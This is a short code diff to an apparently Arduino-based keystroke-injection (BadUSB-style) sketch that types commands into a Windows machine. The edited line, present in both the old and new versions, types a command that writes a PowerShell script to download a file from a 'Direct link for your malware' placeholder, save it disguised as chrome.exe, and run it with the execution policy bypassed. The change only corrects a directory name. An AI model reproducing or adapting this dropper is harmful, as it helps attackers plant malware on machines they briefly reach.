@@ -12,7 +12,7 @@ void setup() {
   type(KEY_RETURN, false);
   Keyboard.releaseAll();
   delay(800);
-  print(F("cd / & mkdir chrome &  cd win & echo (wget 'Direct link for your malware' -outfile chrome.exe) > b.ps1 & powershell -executionpolicy bypass -file b.ps1"));
+  print(F("cd / & mkdir chrome &  cd chrome  & echo (wget 'Direct link for your malware' -outfile chrome.exe) > b.ps1 & powershell -executionpolicy bypass -file b.ps1"));
   type(KEY_RETURN, false);
   Keyboard.releaseAll();
   delay(800);
